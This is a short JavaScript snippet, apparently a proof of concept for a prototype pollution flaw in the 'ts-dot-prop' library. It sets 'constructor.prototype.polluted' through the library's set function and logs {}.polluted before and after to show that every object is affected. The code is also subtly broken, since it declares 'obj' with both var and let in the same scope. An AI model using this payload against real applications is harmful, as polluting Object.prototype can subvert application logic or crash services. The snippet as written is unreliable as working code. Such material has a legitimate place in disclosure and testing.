var obj = {};
obj.constructor.prototype.polluted = undefined;
Object.defineProperty(obj, 'constructor', {
    value: obj.constructor,
    writable: true,
    enumerable: true,
    configurable: true
});
const tsDot = require('ts-dot-prop');
let obj = {};
console.log({}.polluted);
tsDot.set(obj, 'constructor.prototype.polluted', 'yes');
console.log({}.polluted);